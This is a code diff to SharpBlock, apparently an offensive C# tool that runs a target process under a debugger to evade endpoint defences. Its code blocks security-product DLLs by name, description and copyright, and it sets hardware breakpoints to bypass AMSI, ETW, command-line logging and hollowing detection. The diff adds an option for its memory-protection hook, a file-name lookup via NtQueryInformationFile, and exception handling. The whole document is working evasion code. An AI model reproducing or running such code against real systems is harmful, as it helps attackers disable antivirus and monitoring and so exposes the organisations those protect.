@@ -55,30 +55,37 @@ namespace SharpBlock {
         static IntPtr amsiInitalizePtr;
         static IntPtr getCommandLineWPtr;
 
-        private static IntPtr GetIntPtrFromByteArray(byte[] byteArray) {
+        private static StructType GetStructureFromByteArray<StructType>(byte[] byteArray) {
             GCHandle pinnedArray = GCHandle.Alloc(byteArray, GCHandleType.Pinned);
             IntPtr intPtr = pinnedArray.AddrOfPinnedObject();
+            StructType result = (StructType)Marshal.PtrToStructure(intPtr, typeof(StructType));
             pinnedArray.Free();
-            return intPtr;
+            return result;
         }
 
         private static bool ShouldBlockDLL(string dllPath) {
 
             // Get the file version for the notepad.
-            FileVersionInfo dllVersionInfo = FileVersionInfo.GetVersionInfo(dllPath);
-            string dllName = Path.GetFileName(dllPath);
 
-            if (blockDllName.Contains(dllName))
-                return true;
+            try {
 
-            if (dllVersionInfo.FileDescription != null && blockDescription.Contains(dllVersionInfo.FileDescription))
-                return true;
+                string dllName = Path.GetFileName(dllPath);
+                if (blockDllName.Contains(dllName))
+                    return true;
 
-            if (dllVersionInfo.ProductName != null && blockProduct.Contains(dllVersionInfo.ProductName))
-                return true;
+                FileVersionInfo dllVersionInfo = FileVersionInfo.GetVersionInfo(dllPath);
+                
+                if (dllVersionInfo.FileDescription != null && blockDescription.Contains(dllVersionInfo.FileDescription))
+                    return true;
 
-            if (dllVersionInfo.LegalCopyright != null && blockCopyright.Contains(dllVersionInfo.LegalCopyright))
-                return true;
+                if (dllVersionInfo.ProductName != null && blockProduct.Contains(dllVersionInfo.ProductName))
+                    return true;
+
+                if (dllVersionInfo.LegalCopyright != null && blockCopyright.Contains(dllVersionInfo.LegalCopyright))
+                    return true;
+            }catch(Exception e) {
+                Console.WriteLine($"[=] Failed to get file info for DLL {dllPath}, ignoring");
+            }
 
             return false;
         }
@@ -126,10 +133,41 @@ namespace SharpBlock {
             return result != null;
         }
 
+        static string GetFileName(IntPtr handle) {
+            try {
+
+                // Setup buffer to store unicode string
+                int bufferSize = 0x1000; 
+
+                // Allocate unmanaged memory to store name
+                IntPtr pFileNameBuffer = Marshal.AllocHGlobal(bufferSize);
+                IO_STATUS_BLOCK ioStat = new IO_STATUS_BLOCK();
+
+                uint status = NtQueryInformationFile(handle, ref ioStat, pFileNameBuffer, bufferSize, FILE_INFORMATION_CLASS.FileNameInformation);
+
+                // offset=4 seems to work...
+                int offset = 4;
+                long pBaseAddress = pFileNameBuffer.ToInt64();
+                int strLen = Marshal.ReadInt32(pFileNameBuffer);
+
+                // Do the conversion to managed type
+                string fileName = System.Environment.SystemDirectory.Substring(0,2) + Marshal.PtrToStringUni(new IntPtr(pBaseAddress + offset), strLen/2);
+
+                // Release
+                Marshal.FreeHGlobal(pFileNameBuffer);
+
+                return fileName;
+
+            } catch (Exception) {
+                return string.Empty;
+            }
+        }
+
         static string PatchEntryPointIfNeeded(IntPtr moduleHandle, IntPtr imageBase, IntPtr hProcess) {
 
             long fileSize;
-            StringBuilder dllPath = new StringBuilder(1024);
+            uint returned = 0;
+            string dllPath;
 
             if (!WinAPI.GetFileSizeEx(moduleHandle, out fileSize) || fileSize == 0) {
                 return null;
@@ -148,11 +186,7 @@ namespace SharpBlock {
                 return null;
             }
 
-            if (WinAPI.GetFinalPathNameByHandle(moduleHandle, dllPath, (uint)dllPath.Capacity, 0) == 0) {
-                return null;
-            }
-
-            dllPath = dllPath.Replace("\\\\?\\", "");
+            dllPath = GetFileName(moduleHandle);
 
             PE.IMAGE_DOS_HEADER dosHeader = (PE.IMAGE_DOS_HEADER)Marshal.PtrToStructure(mem, typeof(PE.IMAGE_DOS_HEADER));
             PE.IMAGE_FILE_HEADER fileHeader = (PE.IMAGE_FILE_HEADER)Marshal.PtrToStructure(new IntPtr(mem.ToInt64() + dosHeader.e_lfanew), typeof(PE.IMAGE_FILE_HEADER));
@@ -175,7 +209,7 @@ namespace SharpBlock {
                 sizeOfImage = optionalHeader.SizeOfImage;
             }
 
-            if (ShouldBlockDLL(dllPath.ToString())) {
+            if (ShouldBlockDLL(dllPath)) {
 
                 Tuple<long, long> addressRange = new Tuple<long, long>((long)imageBase, (long)imageBase + sizeOfImage);
                 blockAddressRanges.Add(addressRange);
@@ -365,7 +399,7 @@ namespace SharpBlock {
                 Console.WriteLine($"[=] Could not map process to preferred image base 0x{ (PEINFO.Is32Bit ? PEINFO.OptHeader32.ImageBase : PEINFO.OptHeader64.ImageBase):x}, relocating to 0x{pRemoteImage.ToInt64():x}");
                 Map.RelocateModule(PEINFO, pImage, pRemoteImage);
             }
-            Execute.DynamicInvoke.Native.NtWriteVirtualMemory(hProcess, pRemoteImage, pImage, (uint)RegionSize.ToInt32());
+            uint status = Execute.DynamicInvoke.Native.NtWriteVirtualMemory(hProcess, pRemoteImage, pImage, (uint)RegionSize.ToInt32());
 
             foreach (Execute.PE.IMAGE_SECTION_HEADER ish in PEINFO.Sections) {
 
@@ -705,6 +739,7 @@ namespace SharpBlock {
             bool bypassCommandLine = true;
             bool bypassETW = true;
             bool bypassHollowDetect = true;
+            bool bypassVMHook = true;
             bool patchedArgs = false;
             bool kernelBaseLoaded = false;
             bool showWindow = false;
@@ -730,6 +765,7 @@ namespace SharpBlock {
                 .Add("disable-bypass-cmdline", "Disable command line bypass", v => bypassCommandLine = false)
                 .Add("disable-bypass-etw", "Disable ETW bypass", v => bypassETW = false)
                 .Add("disable-header-patch", "Disable process hollow detection bypass", v => bypassHollowDetect = false)
+                .Add("disable-bypass-vmhook", "Disables the NtReadVirtualMemory hook", v => bypassVMHook = false)
                 .Add("h|help", "Display this help", v => showHelp = v != null);
 
             try {
@@ -803,7 +839,6 @@ namespace SharpBlock {
                     UInt32 dwContinueDebugEvent = WinAPI.DBG_CONTINUE;
                     if (bb) {
                         WinAPI.DEBUG_EVENT DebugEvent = GetDebugEvent(debugEventPtr);
-                        IntPtr debugInfoPtr = GetIntPtrFromByteArray(DebugEvent.u);
                         switch (DebugEvent.dwDebugEventCode) {
 
                             /* Uncomment if you want to see OutputDebugString output 
@@ -818,18 +853,19 @@ namespace SharpBlock {
 
                             case WinAPI.CREATE_PROCESS_DEBUG_EVENT:
 
-                                WinAPI.CREATE_PROCESS_DEBUG_INFO CreateProcessDebugInfo = (WinAPI.CREATE_PROCESS_DEBUG_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.CREATE_PROCESS_DEBUG_INFO));
+                                WinAPI.CREATE_PROCESS_DEBUG_INFO CreateProcessDebugInfo = GetStructureFromByteArray<WinAPI.CREATE_PROCESS_DEBUG_INFO>(DebugEvent.u);
                                 processHandles[DebugEvent.dwProcessId] = CreateProcessDebugInfo.hProcess;
                                 threadHandles[DebugEvent.dwThreadId] = CreateProcessDebugInfo.hThread;
 
                                 if (bypassAmsi)
                                     SetHardwareBreakpoint(CreateProcessDebugInfo.hThread, amsiInitalizePtr, 0);
 
-                                SetHardwareBreakpoint(CreateProcessDebugInfo.hThread, ntProtectVirtualMemoryPtr, 3);
+                                if(bypassVMHook)
+                                    SetHardwareBreakpoint(CreateProcessDebugInfo.hThread, ntProtectVirtualMemoryPtr, 3);
 
                                 break;
                             case WinAPI.CREATE_THREAD_DEBUG_EVENT:
-                                WinAPI.CREATE_THREAD_DEBUG_INFO CreateThreadDebugInfo = (WinAPI.CREATE_THREAD_DEBUG_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.CREATE_THREAD_DEBUG_INFO));
+                                WinAPI.CREATE_THREAD_DEBUG_INFO CreateThreadDebugInfo = GetStructureFromByteArray<WinAPI.CREATE_THREAD_DEBUG_INFO>(DebugEvent.u); 
                                 threadHandles[DebugEvent.dwThreadId] = CreateThreadDebugInfo.hThread;
 
                                 if (pi.dwProcessId == DebugEvent.dwProcessId) {
@@ -839,7 +875,8 @@ namespace SharpBlock {
                                     if(bypassETW)
                                         SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], etwEventWritePtr, 2);
 
-                                    SetHardwareBreakpoint(CreateThreadDebugInfo.hThread, ntProtectVirtualMemoryPtr, 3);
+                                    if(bypassVMHook)
+                                        SetHardwareBreakpoint(CreateThreadDebugInfo.hThread, ntProtectVirtualMemoryPtr, 3);
                                 }
 
                                 break;
@@ -849,7 +886,7 @@ namespace SharpBlock {
                                 }
                                 break;
                             case WinAPI.LOAD_DLL_DEBUG_EVENT:
-                                WinAPI.LOAD_DLL_DEBUG_INFO LoadDLLDebugInfo = (WinAPI.LOAD_DLL_DEBUG_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.LOAD_DLL_DEBUG_INFO));
+                                WinAPI.LOAD_DLL_DEBUG_INFO LoadDLLDebugInfo = GetStructureFromByteArray<WinAPI.LOAD_DLL_DEBUG_INFO>(DebugEvent.u);
                                 string dllPath = PatchEntryPointIfNeeded(LoadDLLDebugInfo.hFile, LoadDLLDebugInfo.lpBaseOfDll, processHandles[DebugEvent.dwProcessId]);
 
                                 //Console.WriteLine($"[=] DLL Load: {dllPath}");
@@ -883,9 +920,10 @@ namespace SharpBlock {
                                 break;
 
                             case WinAPI.EXCEPTION_DEBUG_EVENT:
-                                WinAPI.EXCEPTION_DEBUG_INFO ExceptionDebugInfo = (WinAPI.EXCEPTION_DEBUG_INFO)Marshal.PtrToStructure(debugInfoPtr, typeof(WinAPI.EXCEPTION_DEBUG_INFO));
+                                WinAPI.EXCEPTION_DEBUG_INFO ExceptionDebugInfo = GetStructureFromByteArray<WinAPI.EXCEPTION_DEBUG_INFO>(DebugEvent.u);
 
-                                if (ExceptionDebugInfo.ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP) {
+                                if (ExceptionDebugInfo.ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_SINGLE_STEP ||
+                                       ExceptionDebugInfo.ExceptionRecord.ExceptionCode == WinAPI.EXCEPTION_BREAKPOINT) {
 
                                     //Check to see if the single step breakpoint is at AmsiInitalize
                                     if (ExceptionDebugInfo.ExceptionRecord.ExceptionAddress == amsiInitalizePtr) {
@@ -921,12 +959,18 @@ namespace SharpBlock {
                                     } else {
                                         SetHardwareBreakpoint(threadHandles[DebugEvent.dwThreadId], ntProtectVirtualMemoryPtr, 3);
                                     }
-
+                                
                                 } else {
                                     dwContinueDebugEvent = WinAPI.DBG_EXCEPTION_NOT_HANDLED;
                                 }
 
-                                //Console.WriteLine($"Exception 0x{ExceptionDebugInfo.ExceptionRecord.ExceptionCode:x} occured at 0x{ExceptionDebugInfo.ExceptionRecord.ExceptionAddress.ToInt64():x}");
+                                if (ExceptionDebugInfo.dwFirstChance == 0 && ExceptionDebugInfo.ExceptionRecord.ExceptionCode != WinAPI.EXCEPTION_SINGLE_STEP) {
+                                    Console.WriteLine($"Exception 0x{ExceptionDebugInfo.ExceptionRecord.ExceptionCode:x} occured at 0x{ExceptionDebugInfo.ExceptionRecord.ExceptionAddress.ToInt64():x}");
+                                    for(int idx=0; idx< ExceptionDebugInfo.ExceptionRecord.NumberParameters; ++idx ) {
+                                        Console.WriteLine($"\tParameter: 0x{ExceptionDebugInfo.ExceptionRecord.ExceptionInformation[idx]}");
+                                    }                                 
+                                }
+
                                 break;
                         }
 
